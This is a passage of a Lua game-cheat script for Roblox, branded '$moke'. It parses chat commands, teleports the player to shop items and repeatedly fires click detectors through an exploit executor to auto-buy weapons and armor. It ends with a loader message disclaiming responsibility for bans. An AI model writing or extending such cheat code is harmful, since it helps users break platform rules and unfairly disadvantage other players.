				if table.find(muted, v.Name) then
					local removemute = table.find(muted, v.Name)
					table.remove(muted, removemute)
					print('unmuteed ' .. v.Name)
				end
			end
		else
			local plrtoview = arguments[2]
			if plrtoview then
				local ptv = findPlayer(plrtoview)
				if ptv then  
					if table.find(muted, ptv.Name) then
						local removemute = table.find(muted, ptv.Name)
						table.remove(muted, removemute)
						print('unmuteed ' .. ptv.Name)
					end
				end
			end
		end
	end

	if CMD == 'buy' then
		local itemtobuy = nil
		local itemtobuyammofor = nil
		local ammomodel = nil
		local oldpos = player.Character.HumanoidRootPart.CFrame
		local Cash = player.DataFolder.Currency.Value
		for i,v in pairs(game:GetService('Workspace').Ignored.Shop:GetChildren()) do
			if itemtobuy == nil then
				if string.find(string.lower(v.Name), arguments[2]) and not string.find(v.Name, 'Ammo') and itemtobuy == nil then
					if arguments[2] == 'shotgun' then
						itemtobuy = game:GetService("Workspace").Ignored.Shop["[Shotgun] - $1250"]
					elseif arguments[2] == 'tacshotgun' or arguments[2] == 'tacticalshotgun' then
						itemtobuy = game:GetService("Workspace").Ignored.Shop["[TacticalShotgun] - $1750"]
					elseif arguments[2] == 'key' then
						itemtobuy = game:GetService("Workspace").Ignored.Shop["[Key] - $125"]
					else
						itemtobuy = v
					end
				end
				if itemtobuy then
					if string.find(itemtobuy.Name, 'Mask') then
						itemtobuy = game:GetService("Workspace").Ignored.Shop["[Surgeon Mask] - $25"]
					end
					local pricesplit = string.split(itemtobuy.Name, '$')
					local itemnamesplit = string.split(itemtobuy.Name, '-')
					local price = tonumber(pricesplit[2])
					local name = string.gsub(tostring(itemnamesplit[1]), " ", "")
					print(name)
					local function buygun()
						wait()
						Cash = player.DataFolder.Currency.Value
						player.Character.HumanoidRootPart.CFrame = itemtobuy.Head.CFrame
						fireclickdetector(itemtobuy.ClickDetector)
					end
					if name == '[MoneyGun]' then
						repeat buygun() until player.Backpack:FindFirstChild('[Money Gun]') or Cash < price
					elseif name == '[Double' then
						repeat buygun() until player.Backpack:FindFirstChild('[Double-Barrel SG]') or Cash < price
					elseif name == '[SurgeonMask]' then
						repeat buygun() until player.Backpack:FindFirstChild('[Surgeon Mask]') or Cash < price
					elseif name ~= '[MediumArmor]' then
						repeat buygun() until player.Backpack:FindFirstChild(name) or Cash < price
					else
						repeat buygun() until player.Backpack:FindFirstChild(name) or Cash < price or player.Character.BodyEffects.Armor.Value == 100
					end
					player.Character.HumanoidRootPart.CFrame = oldpos
				end
			end
		end
	end
end
player.Chatted:Connect(function(message,recipient)
	message = string.lower(message)
	local splitString = message:split(" ") -- Will Split String when space
	local slashCommand = splitString[1] 
	local cmd = slashCommand:split(prefix)	
	local cmdName = cmd[2]	
	if commands[cmdName] then
		local arguments = {} 
		for i = 2, #splitString, 1 do
			table.insert(arguments,splitString[i])			
		end
		commands[cmdName](arguments)
	end
end)


------------------------------------------------------------------------------------------------------------------------------------------------
------------------------------------------------------------------------------------------------------------------------------------------------
------------------------------------------------------------------------------------------------------------------------------------------------
------------------------------------------------------------------------------------------------------------------------------------------------
------------------------------------------------------------------------------------------------------------------------------------------------

wait(1)
if ModCheck[player.UserId] then
	IsMod = true
	DisableMod = true
	notify('you are immune to mod powers | type /e noshield or /e shield to toggle')
elseif table.find(swagmins, player.UserId) then
	notify('$moke Loaded\nWe are not responsible for any bans\ndiscord.gg/E6HVDpqm9t')
	notify('granted admin powers :3')
	IsMod = false
	DisableMod = false
else
	IsMod = false
	DisableMod = false
	notify('$moke Loaded\nWe are not responsible for any bans\ndiscord.gg/E6HVDpqm9t')
end
smoke.Name = "smokee"